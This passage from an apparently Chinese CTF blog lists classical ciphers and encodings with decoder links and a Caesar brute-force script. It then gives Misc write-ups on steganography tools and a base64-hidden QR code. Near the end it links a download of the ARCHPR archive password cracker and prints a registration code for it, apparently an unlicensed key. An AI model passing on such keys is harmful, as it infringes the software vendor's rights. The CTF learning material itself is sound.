class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># _*_ coding: utf-8 _*_</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">__author__ = <span class="string">&#x27;0HB&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encryption</span>(<span class="params">Emessage, key</span>):</span></span><br><span class="line">    change = []</span><br><span class="line">    message = <span class="built_in">list</span>(Emessage.lower())</span><br><span class="line">    <span class="keyword">for</span> letter <span class="keyword">in</span> message:</span><br><span class="line">        <span class="keyword">if</span> letter &gt;= <span class="string">&#x27;a&#x27;</span> <span class="keyword">and</span> letter &lt;= <span class="string">&#x27;z&#x27;</span>:</span><br><span class="line">            letter = <span class="built_in">chr</span>((<span class="built_in">ord</span>(letter) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) + <span class="number">26</span> - key) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">            change.append(letter)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            change.append(letter)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(change)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">def search_key(mabeyMessage, words):</span></span><br><span class="line"><span class="string">    result = []</span></span><br><span class="line"><span class="string">    n = 0</span></span><br><span class="line"><span class="string">    result = re.split(&#x27; |,|\.|!|\?&#x27;, mabeyMessage)</span></span><br><span class="line"><span class="string">    for em in result:</span></span><br><span class="line"><span class="string">        if em in words.split():</span></span><br><span class="line"><span class="string">            n = n + 1</span></span><br><span class="line"><span class="string">    return n</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    Emessage = <span class="built_in">input</span>(<span class="string">&#x27;请输入凯撒密文：&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    words = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line"></span><br><span class="line">    pipei = []</span><br><span class="line">    <span class="keyword">for</span> K <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">26</span>):</span><br><span class="line">        start = time.perf_counter()</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        for i in range(1, 27):</span></span><br><span class="line"><span class="string">            pipei.append(search_key(encryption(Emessage, i), words))</span></span><br><span class="line"><span class="string">            if pipei[i - 1] &gt; max:</span></span><br><span class="line"><span class="string">                max = pipei[i - 1]</span></span><br><span class="line"><span class="string">                K = i</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        end = time.perf_counter()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;位移&#x27;</span>, K, <span class="string">&#x27;明文：&#x27;</span>, encryption(Emessage, K))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"># 加密用法</span></span><br><span class="line"><span class="string">        m1 = &#x27;what can I do for you?&#x27;</span></span><br><span class="line"><span class="string">        e1 = encryption(m1, 3)</span></span><br><span class="line"><span class="string">        print(&#x27;加密后:&#x27;, e1)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p><img src="http://a1.qpic.cn/psc?/V11bsrVH039Qrc/ruAMsa53pVQWN7FLK88i5nnwgm1ujFWL3Dz4oX3aBIKPkUWeTFuMGk08T2gHvDhV8pc5IFOc8qiXCu6YdqcaFzwS*rRp1A2WjuI0n9om7fU!/c&ek=1&kp=1&pt=0&bo=lAEmBAAAAAADF4U!&tl=1&vuin=1915885792&tm=1636372800&sce=60-2-2&rf=0-0" alt="xgt"></p><h1 id="29-拼音编码"><a href="#29-拼音编码" class="headerlink" title="29.拼音编码"></a>29.拼音编码</h1><h2 id="·简介-10"><a href="#·简介-10" class="headerlink" title="·简介"></a>·简介</h2><blockquote><p>即将生僻字转换成拼音，然后读出来的文字就是明文</p></blockquote><h2 id="·加-解密方式：网页解析-4"><a href="#·加-解密方式：网页解析-4" class="headerlink" title="·加/解密方式：网页解析"></a>·加/解密方式：<a href="https://pinyin.supfree.net/">网页解析</a></h2><h1 id="30-URL编码"><a href="#30-URL编码" class="headerlink" title="30.URL编码"></a>30.URL编码</h1><h2 id="·简介-11"><a href="#·简介-11" class="headerlink" title="·简介"></a>·简介</h2><blockquote><p>密文格式：%66%6C%61%67%7B%61%6E%64%20%31%3D%31%7D</p></blockquote><h2 id="·加-解密方式：网页解析-5"><a href="#·加-解密方式：网页解析-5" class="headerlink" title="·加/解密方式：网页解析"></a>·加/解密方式：<a href="http://www.hiencode.com/url.html">网页解析</a></h2><p><img src="http://m.qpic.cn/psc?/V11bsrVH039Qrc/45NBuzDIW489QBoVep5mcV*37IPy9kA1ecr8haMRWGFmbEEja1yx3sNG*aTSKt2YboAPdZkb7W*74qDhTiSVEvuUdetxtOnKBt1eC2ZUBcw!/b&bo=SgYwBAAAAAADF0o!&rf=viewer_4" alt="tp"></p><h1 id="31-quoted-printable编码"><a href="#31-quoted-printable编码" class="headerlink" title="31.quoted-printable编码"></a>31.quoted-printable编码</h1><h2 id="加-解密方式：网页解析"><a href="#加-解密方式：网页解析" class="headerlink" title="加/解密方式：网页解析"></a>加/解密方式：<a href="http://www.hiencode.com/quoted.html">网页解析</a></h2><p><img src="https://img2020.cnblogs.com/blog/1807187/202011/1807187-20201105215201197-695477355.png" alt="tp"></p><h1 id="32-Uuencode编码"><a href="#32-Uuencode编码" class="headerlink" title="32.Uuencode编码"></a>32.Uuencode编码</h1><h2 id="·加-解密方式：网页解析-6"><a href="#·加-解密方式：网页解析-6" class="headerlink" title="·加/解密方式：网页解析"></a>·加/解密方式：<a href="http://www.hiencode.com/uu.html">网页解析</a></h2><p><img src="http://m.qpic.cn/psc?/V11bsrVH039Qrc/45NBuzDIW489QBoVep5mceYQrX0duHSPjq3EHbtX8hCf*AHuD*j3CsrKSrNsvbt14FNSIe4gr2*k4SV4hImPWWdDkg0.mwlWeerVMAsxNOM!/b&bo=iAUYBAAAAAADF6M!&rf=viewer_4" alt="uu"></p><h1 id="33-Rabbit编码"><a href="#33-Rabbit编码" class="headerlink" title="33.Rabbit编码"></a>33.Rabbit编码</h1><h2 id="·加-解密方式：网页解析-7"><a href="#·加-解密方式：网页解析-7" class="headerlink" title="·加/解密方式：网页解析"></a>·加/解密方式：<a href="http://www.jsons.cn/rabbitencrypt/">网页解析</a></h2><p><img src="http://m.qpic.cn/psc?/V11bsrVH039Qrc/45NBuzDIW489QBoVep5mcT8JJAlIWGaM1rIQRF7Hc*32nOBSrYQb.tm7OMdLM0IupKIO3svPrJ0RaPlHiYLOTqoagPQ8qhhr6xKLNeKHX2E!/b&bo=jAPeAgAAAAADF2E!&rf=viewer_4" alt="tp"></p><h1 id="34-ROT编码"><a href="#34-ROT编码" class="headerlink" title="34.ROT编码"></a>34.ROT编码</h1><h2 id="·简介-12"><a href="#·简介-12" class="headerlink" title="·简介"></a>·简介</h2><blockquote><p>ROT5、ROT13、ROT18、ROT47 编码是一种简单的码元位置顺序替换暗码。此类编码具有可逆性，可以自我解密，主要用于应对快速浏览，或者是机器的读取，而不让其理解其意。</p><p>ROT5 是 rotate by 5 places 的简写，意思是旋转5个位置，其它皆同。下面分别说说它们的编码方式：<br>ROT5：只对数字进行编码，用当前数字往前数的第5个数字替换当前数字，例如当前为0，编码后变成5，当前为1，编码后变成6，以此类推顺序循环。<br>ROT13：只对字母进行编码，用当前字母往前数的第13个字母替换当前字母，例如当前为A，编码后变成N，当前为B，编码后变成O，以此类推顺序循环。<br>ROT18：这是一个异类，本来没有，它是将ROT5和ROT13组合在一起，为了好称呼，将其命名为ROT18。<br>ROT47：对数字、字母、常用符号进行编码，按照它们的ASCII值进行位置替换，用当前字符ASCII值往前数的第47位对应字符替换当前字符，例如当前为小写字母z，编码后变成大写字母K，当前为数字0，编码后变成符号_。用于ROT47编码的字符其ASCII值范围是33－126，具体可参考ASCII编码。</p></blockquote><h2 id="·加-解密实现：网页解析"><a href="#·加-解密实现：网页解析" class="headerlink" title="·加/解密实现：网页解析"></a>·加/解密实现：<a href="https://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php">网页解析</a></h2><h1 id="35-社会主义核心价值观编码"><a href="#35-社会主义核心价值观编码" class="headerlink" title="35.社会主义核心价值观编码"></a>35.社会主义核心价值观编码</h1><h2 id="·加-解密方式：网页解析-8"><a href="#·加-解密方式：网页解析-8" class="headerlink" title="·加/解密方式：网页解析"></a>·加/解密方式：<a href="https://atool.vip/corevalue/">网页解析</a></h2><p><img src="http://m.qpic.cn/psc?/V11bsrVH039Qrc/45NBuzDIW489QBoVep5mca8WwwSplFJr2byxhYEj6ePhfbYCudn2qan.bkjnOZtxkpBK959hHFXhWm8ctvNPafOQFdFjqRG7H0GnpSArGes!/b&bo=NAQqAwAAAAADFys!&rf=viewer_4" alt="tp"></p><h1 id="39-希尔密码"><a href="#39-希尔密码" class="headerlink" title="39.希尔密码"></a>39.希尔密码</h1><h2 id="·简介-13"><a href="#·简介-13" class="headerlink" title="·简介"></a>·简介</h2><blockquote><p>希尔密码是运用基本矩阵论原理的替换密码，由Lester S. Hill在1929年发明。<br>每个字母当作26进制数字：A=0, B=1, C=2… 一串字母当成n维向量，跟一个n×n的矩阵相乘，再将得出的结果模26。</p></blockquote><h2 id="·加-解密方式：网页解析-9"><a href="#·加-解密方式：网页解析-9" class="headerlink" title="·加/解密方式：网页解析"></a>·加/解密方式：<a href="http://www.atoolbox.net/Tool.php?Id=914">网页解析</a></h2><h1 id="40-BubbleBabble"><a href="#40-BubbleBabble" class="headerlink" title="40. BubbleBabble"></a>40. BubbleBabble</h1><h1 id="41-Polybius"><a href="#41-Polybius" class="headerlink" title="41. Polybius"></a>41. Polybius</h1><ul><li><a href="http://www.atoolbox.net/Tool.php?Id=913">http://www.atoolbox.net/Tool.php?Id=913</a></li></ul><h1 id="42-ADFGX、ADFGVX"><a href="#42-ADFGX、ADFGVX" class="headerlink" title="42. ADFGX、ADFGVX"></a>42. ADFGX、ADFGVX</h1><ul><li><a href="https://www.qqxiuzi.cn/bianma/qipanmima.php">https://www.qqxiuzi.cn/bianma/qipanmima.php</a></li></ul><h1 id="43-动物密码"><a href="#43-动物密码" class="headerlink" title="43. 动物密码"></a>43. 动物密码</h1><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220720181859059.png" alt="image-20220720181859059"></p><h1 id="44-四方密码"><a href="#44-四方密码" class="headerlink" title="44 四方密码"></a>44 四方密码</h1><ul><li><a href="http://www.hiencode.com/four.html">http://www.hiencode.com/four.html</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Misc·buu刷题记录</title>
      <link href="/2021/12/09/Misc%C2%B7buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2021/12/09/Misc%C2%B7buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Misc·buu题解及工具下载"><a href="#Misc·buu题解及工具下载" class="headerlink" title="Misc·buu题解及工具下载"></a>Misc·buu题解及工具下载</h1><h2 id="1-Misc工具–zsteg"><a href="#1-Misc工具–zsteg" class="headerlink" title="1. Misc工具–zsteg"></a>1. Misc工具–zsteg</h2><h3 id="·简介"><a href="#·简介" class="headerlink" title="·简介"></a>·简介</h3><blockquote><p>zsteg 是Github上开源的<strong>PNG</strong>、<strong>BMP</strong>文件<strong>隐写爆破</strong>工具</p></blockquote><h3 id="·安装"><a href="#·安装" class="headerlink" title="·安装"></a>·安装</h3><p><strong>终端</strong>依次输入:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/zed-0xff/zsteg</span><br><span class="line"><span class="built_in">cd</span> zsteg/</span><br><span class="line">gem install zsteg</span><br></pre></td></tr></table></figure><p>若提示<strong>权限不够</strong>，终端输入:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure><p>如果下的太慢了，<strong>换源</strong>（<strong>终端</strong>依次输入:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gem sources --remove https://rubygems.org/</span><br><span class="line">gem sources --add https://gems.ruby-china.com/</span><br><span class="line">gem sources -l</span><br></pre></td></tr></table></figure><h3 id="·使用"><a href="#·使用" class="headerlink" title="·使用"></a>·使用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zsteg -a file_path</span><br></pre></td></tr></table></figure><h3 id="·-效果图"><a href="#·-效果图" class="headerlink" title="· 效果图"></a>· 效果图</h3><p><img src="http://m.qpic.cn/psc?/V11bsrVH039Qrc/45NBuzDIW489QBoVep5mce5Ro9REz5tEqwJEdRmdorweoecax4nllCdFRWongj19mPI7hD4hLGdB5MpXcHBAriN1mtAzNRHbkFKX3htKLnU!/b&bo=ogZmAwAAAAADR6M!&rf=viewer_4" alt="img"></p><p>（题源：2021春秋杯秋季赛勇者赛道·Misc·**helloshark</p><h2 id="2-Misc工具–foremsot"><a href="#2-Misc工具–foremsot" class="headerlink" title="2. Misc工具–foremsot"></a>2. Misc工具–foremsot</h2><h3 id="·简介-1"><a href="#·简介-1" class="headerlink" title="·简介"></a>·简介</h3><blockquote><p>同binwalk(Kali自带)功能一样，具有拆分隐藏文件的功能，不同在于自动生成并放入output文件夹中</p></blockquote><h3 id="·安装-1"><a href="#·安装-1" class="headerlink" title="·安装"></a>·安装</h3><p><strong>终端</strong>输入:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install foremost</span><br></pre></td></tr></table></figure><ul><li>若提示:</li></ul><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E: Unable <span class="keyword">to</span> fetch <span class="keyword">some</span> archives, maybe <span class="built_in">run</span> apt-<span class="keyword">get</span> update <span class="keyword">or</span> <span class="keyword">try</span> <span class="keyword">with</span> <span class="comment">--fix-missing?</span></span><br></pre></td></tr></table></figure><ul><li>则要更新了，输入：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br></pre></td></tr></table></figure><p>最后检查安装是否成功，输入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foremost -h</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210203220402585.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU2MzU0OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="·使用-1"><a href="#·使用-1" class="headerlink" title="·使用"></a>·使用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foremost file_path</span><br></pre></td></tr></table></figure><h2 id="3-Misc·N种方法解决"><a href="#3-Misc·N种方法解决" class="headerlink" title="3.Misc·N种方法解决"></a>3.Misc·N种方法解决</h2><h4 id="·题目"><a href="#·题目" class="headerlink" title="·题目"></a>·题目</h4><blockquote><p>下载后得到key.exe</p></blockquote><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ul><li>从简到难，string key.exe<span id="more"></span></li></ul><blockquote><p>data:image/jpg;base64,iVBORw0KGgoAAAANSUhEUgAAAIUAAACFCAYAAAB12js8AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAArZSURBVHhe7ZKBitxIFgTv/396Tx564G1UouicKg19hwPCDcrMJ9m7/7n45zfdxe5Z3sJ7prHbf9rXO3P4lLvYPctbeM80dvtP+3pnDp9yF7tneQvvmcZu/2lf78zhU+5i9yxv4T3T2O0/7eud68OT2H3LCft0l/ae9ZlTo+23pPvX7/rwJHbfcsI+3aW9Z33m1Gj7Len+9bs+PIndt5ywT3dp71mfOTXafku6f/2uD09i9y0n7NNd2nvWZ06Ntt+S7l+/68MJc5O0OSWpcyexnFjfcsI+JW1ukpRfv+vDCXOTtDklqXMnsZxY33LCPiVtbpKUX7/rwwlzk7Q5JalzJ7GcWN9ywj4lbW6SlF+/68MJc5O0OSWpcyexnFjfcsI+JW1ukpRfv+vDCXOTWE7a/i72PstJ2zfsHnOTpPz6XR9OmJvEctL2d7H3WU7avmH3mJsk5dfv+nDC3CSWk7a/i73PctL2DbvH3CQpv37XhxPmJrGctP1d7H2Wk7Zv2D3mJkn59bs+nDA3ieWEfdNImylJnelp7H6bmyTl1+/6cMLcJJYT9k0jbaYkdaansfttbpKUX7/rwwlzk1hO2DeNtJmS1Jmexu63uUlSfv2uDyfMTWI5Yd800mZKUmd6Grvf5iZJ+fW7PjzJ7v12b33LSdtvsfuW75LuX7/rw5Ps3m/31rectP0Wu2/5Lun+9bs+PMnu/XZvfctJ22+x+5bvku5fv+vDk+zeb/fWt5y0/Ra7b/ku6f71+++HT0v+5l3+tK935vApyd+8y5/29c4cPiX5m3f5077emcOnJH/zLn/ar3d+/flBpI+cMDeNtJkSywn79BP5uK+yfzTmppE2U2I5YZ9+Ih/3VfaPxtw00mZKLCfs00/k477K/tGYm0baTInlhH36iSxflT78TpI605bdPbF7lhvct54mvWOaWJ6m4Z0kdaYtu3ti9yw3uG89TXrHNLE8TcM7SepMW3b3xO5ZbnDfepr0jmlieZqGd5LUmbbs7onds9zgvvU06R3TxPXcSxPrW07YpyR1pqTNKUmdKUmdk5LUaXzdWB/eYX3LCfuUpM6UtDklqTMlqXNSkjqNrxvrwzusbzlhn5LUmZI2pyR1piR1TkpSp/F1Y314h/UtJ+xTkjpT0uaUpM6UpM5JSeo0ft34+vOGNLqDfUosN7inhvUtJ+ybRtpMd0n39Goa3cE+JZYb3FPD+pYT9k0jbaa7pHt6NY3uYJ8Syw3uqWF9ywn7ppE2013SPb2aRnewT4nlBvfUsL7lhH3TSJvpLunecjWV7mCftqQbjSR1puR03tqSbkx/wrJqj7JPW9KNRpI6U3I6b21JN6Y/YVm1R9mnLelGI0mdKTmdt7akG9OfsKzao+zTlnSjkaTOlJzOW1vSjelPWFbp8NRImylJnWnL7r6F7zN3STcb32FppUNTI22mJHWmLbv7Fr7P3CXdbHyHpZUOTY20mZLUmbbs7lv4PnOXdLPxHZZWOjQ10mZKUmfasrtv4fvMXdLNxndYWunQlFhutHv2W42n+4bds7wl3VuuskSJ5Ua7Z7/VeLpv2D3LW9K95SpLlFhutHv2W42n+4bds7wl3VuuskSJ5Ua7Z7/VeLpv2D3LW9K97avp6GQ334X3KWlz+tukb5j+hO2/hX3Ebr4L71PS5vS3Sd8w/Qnbfwv7iN18F96npM3pb5O+YfoTtv8W9hG7+S68T0mb098mfcP0Jxz/W+x+FPethvUtN2y/m7fwnvm1+frzIOklDdy3Gta33LD9bt7Ce+bX5uvPg6SXNHDfaljfcsP2u3kL75lfm68/D5Je0sB9q2F9yw3b7+YtvGd+bb7+vCEN7ySpMzXSZrqL3bOcsN9Kns4T2uJRk6TO1Eib6S52z3LCfit5Ok9oi0dNkjpTI22mu9g9ywn7reTpPKEtHjVJ6kyNtJnuYvcsJ+y3kqfzxNLiEUosJ+xTYvkudt9yg3tqpM2d5Cf50mKJEssJ+5RYvovdt9zgnhppcyf5Sb60WKLEcsI+JZbvYvctN7inRtrcSX6SLy2WKLGcsE+J5bvYfcsN7qmRNneSn+RLK5UmbW4Sywn7lOzmhH3a0u7ZN99hadmRNjeJ5YR9SnZzwj5taffsm++wtOxIm5vEcsI+Jbs5YZ+2tHv2zXdYWnakzU1iOWGfkt2csE9b2j375jtcvTz+tuX0vrXF9sxNkjrTT+T6rvyx37ac3re22J65SVJn+olc35U/9tuW0/vWFtszN0nqTD+R67vyx37bcnrf2mJ75iZJneknUn+V/aWYUyNtpqTNqZE2UyNtGlvSjTsT9VvtKHNqpM2UtDk10mZqpE1jS7pxZ6J+qx1lTo20mZI2p0baTI20aWxJN+5M1G+1o8ypkTZT0ubUSJupkTaNLenGnYnl6TujO2zP3DTSZkp2c8L+0xppM32HpfWTIxPbMzeNtJmS3Zyw/7RG2kzfYWn95MjE9sxNI22mZDcn7D+tkTbTd1haPzkysT1z00ibKdnNCftPa6TN9B2uXh5/S9rcbEk37jR2+5SkzpSkzo4kdaavTg6/JW1utqQbdxq7fUpSZ0pSZ0eSOtNXJ4ffkjY3W9KNO43dPiWpMyWpsyNJnemrk8NvSZubLenGncZun5LUmZLU2ZGkzvTVWR/e0faJ7Xdzw/bMKbGc7PbNE1x3uqNtn9h+Nzdsz5wSy8lu3zzBdac72vaJ7Xdzw/bMKbGc7PbNE1x3uqNtn9h+Nzdsz5wSy8lu3zzBcsVewpyS1LmTWG7Y3nLCPm1JN05KLP/D8tRGzClJnTuJ5YbtLSfs05Z046TE8j8sT23EnJLUuZNYbtjecsI+bUk3Tkos/8Py1EbMKUmdO4nlhu0tJ+zTlnTjpMTyP/R/i8PwI//fJZYb3Jvv8Pd/il+WWG5wb77D3/8pflliucG9+Q5//6f4ZYnlBvfmO1y9PH7KFttbfhq+zySpMyVtbr7D1cvjp2yxveWn4ftMkjpT0ubmO1y9PH7KFttbfhq+zySpMyVtbr7D1cvjp2yxveWn4ftMkjpT0ubmO1y9ftRg9y0n7FPD+paTtk9O71sT13Mv7WD3LSfsU8P6lpO2T07vWxPXcy/tYPctJ+xTw/qWk7ZPTu9bE9dzL+1g9y0n7FPD+paTtk9O71sT1/P7EnOTWG5wb5LUmRptn3D/6b6+eX04YW4Syw3uTZI6U6PtE+4/3dc3rw8nzE1iucG9SVJnarR9wv2n+/rm9eGEuUksN7g3SepMjbZPuP90X9+8PpwwN0mb72pYfzcn1rf8NHwffXXWhxPmJmnzXQ3r7+bE+pafhu+jr876cMLcJG2+q2H93ZxY3/LT8H301VkfTpibpM13Nay/mxPrW34avo++OuvDCXOT7OZGu7e+5YT9XYnlhH36DlfvfsTcJLu50e6tbzlhf1diOWGfvsPVux8xN8lubrR761tO2N+VWE7Yp+9w9e5HzE2ymxvt3vqWE/Z3JZYT9uk7XL1+1GD3LX8avt8klhu2t5yc6F+/68OT2H3Ln4bvN4nlhu0tJyf61+/68CR23/Kn4ftNYrlhe8vJif71uz48id23/Gn4fpNYbtjecnKif/3+++HTnub0fd4zieUtvLfrO1y9PH7K05y+z3smsbyF93Z9h6uXx095mtP3ec8klrfw3q7vcPXy+ClPc/o+75nE8hbe2/Udzv9X+sv/OP/881/SqtvcdpBh+wAAAABJRU5ErkJggg==</p></blockquote><ul><li><p>密码手看到base64，兴奋。之后网页解码不给力，用python3跑了下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">b64 = <span class="string">b&#x27;iVBORw0KGgoAAAANSUhEUgAAAIUAAACFCAYAAAB12js8AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAArZSURBVHhe7ZKBitxIFgTv/396Tx564G1UouicKg19hwPCDcrMJ9m7/7n45zfdxe5Z3sJ7prHbf9rXO3P4lLvYPctbeM80dvtP+3pnDp9yF7tneQvvmcZu/2lf78zhU+5i9yxv4T3T2O0/7eud68OT2H3LCft0l/ae9ZlTo+23pPvX7/rwJHbfcsI+3aW9Z33m1Gj7Len......U5ErkJggg==&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(b64))</span><br><span class="line"><span class="comment"># b&#x27;\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x85\x00\x00\x00\x85\x08\x06\x00\x00\x00u\xda;&lt;\x00\x00\x00\x01sRG...\xc2\r\xca\xcc\&#x27;\xd9\x...ffi_\xef\xcc\xe1S\xeeb\xf7,o\xe1=\xd3\xd8\xed?\xed\xeb\x9d\....\x7f\x1a\xbe\xdf$\x96\x1b\xb6\xb7\x9c\x9c\xe8_\xbf\xeb\xc3\x93\xd8&#125;\xcb\x9f\x86\xef7\x89\xe5\x86\xed-\&#x27;\&#x27;\xfa\xd7\xef\xfa\xf0$v\xdf\xf2\xa7\xe1\xfbMb\xb9a&#123;\xcb\xc9\x89\xfe\xf5\xbb&gt;&lt;\x89\xdd\xb7\xfci\xf...x00IEND\xaeB`\x82&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>看到了PNG，高兴。其后如何也得不到下一步思路，看题解后，<strong>开了眼了</strong>🤔</p></li><li><p><strong>将第一步string内容完整复制到网页端</strong>,得到二维码，扫码即得flag。</p></li></ul><h2 id="4-Misc·LSB"><a href="#4-Misc·LSB" class="headerlink" title="4. Misc·LSB"></a>4. Misc·LSB</h2><h3 id="·题目-1"><a href="#·题目-1" class="headerlink" title="·题目"></a>·题目</h3><blockquote><p>题目说的明显，<strong>LSB隐写</strong>，有过多博客对此解释、教学，在此不赘述</p></blockquote><h3 id="·要点"><a href="#·要点" class="headerlink" title="·要点"></a>·要点</h3><ul><li>导出时候记得选 <strong>Save Bin</strong></li></ul><h2 id="5-ARCHPR-下载｜注册"><a href="#5-ARCHPR-下载｜注册" class="headerlink" title="5. ARCHPR 下载｜注册"></a>5. ARCHPR 下载｜注册</h2><h3 id="·-提示"><a href="#·-提示" class="headerlink" title="· 提示"></a>· 提示</h3><blockquote><p>若是<strong>英文</strong>界面，则看<strong>大致位置</strong>也能完成注册</p></blockquote><h3 id="·-下载"><a href="#·-下载" class="headerlink" title="· 下载"></a>· 下载</h3><blockquote><p><a href="https://www.icloud.com.cn/iclouddrive/0sDdf9kTxVd5HcJ-9VFBp5-zA#ARCHPR">ARCHPR下载链接</a></p></blockquote><h3 id="·-注册码："><a href="#·-注册码：" class="headerlink" title="· 注册码："></a>· 注册码：</h3><blockquote><p><strong>ARCHPRP-GSVMT-66892-GKVMB-52992</strong></p></blockquote><h3 id="·-注册步骤"><a href="#·-注册步骤" class="headerlink" title="· 注册步骤"></a>· 注册步骤</h3><ol><li>下载后解压，打开软件</li></ol><p><img src="http://m.qpic.cn/psc?/V11bsrVH039Qrc/45NBuzDIW489QBoVep5mceLOXqJUoW9gi4Wtdz4ZUODu5X8h1h91UnOIbDgXakz0GNDHCzCPRI*6OjlEghtUFPSrUJnXdJPeVD*xmsVEyos!/b&bo=NgQcAwAAAAADNz8!&rf=viewer_4" alt="img"></p><ol start="2"><li><p>输入注册码（ ARCHPRP-GSVMT-66892-GKVMB-52992 ）</p><p><img src="http://www.aichunjing.com/d/file/2018-12-26/7e858299fd1a5d0d016a11d5a9b48050.jpg" alt="img"></p></li><li><p>注册完成</p><p><img src="http://www.aichunjing.com/d/file/2018-12-26/2fecbb201779f872a51ab6f35dda1d59.jpg" alt="img"></p></li></ol><h3 id="·-修改语言"><a href="#·-修改语言" class="headerlink" title="· 修改语言"></a>· 修改语言</h3><blockquote><p><del>眼瞎找了一宿</del>,option选项卡里选language为简体中文</p></blockquote><ul><li>option选项卡</li></ul><p><img src="http://m.qpic.cn/psc?/V11bsrVH039Qrc/45NBuzDIW489QBoVep5mcYbP4vBhKWZ7y2piI9p0s3WVEEM5YjPSJdB7N6D1GNs3XCxb7QmVI5I3bkrQqVfDDk6xW.hfoMtkqg7Fmgz4WGY!/b&bo=hAJ2AgAAAAADN.A!&rf=viewer_4" alt="img"></p><ul><li>语言设置</li></ul><p><img src="http://m.qpic.cn/psc?/V11bsrVH039Qrc/45NBuzDIW489QBoVep5mcYbP4vBhKWZ7y2piI9p0s3Wp5TnGZXGnA5sfj4bbKmqB80z446jg9Z9vtz8hrjbnIxLGKASVi.ZINJ9dxnqGeC4!/b&bo=iAJ2AgAAAAADN.w!&rf=viewer_4" 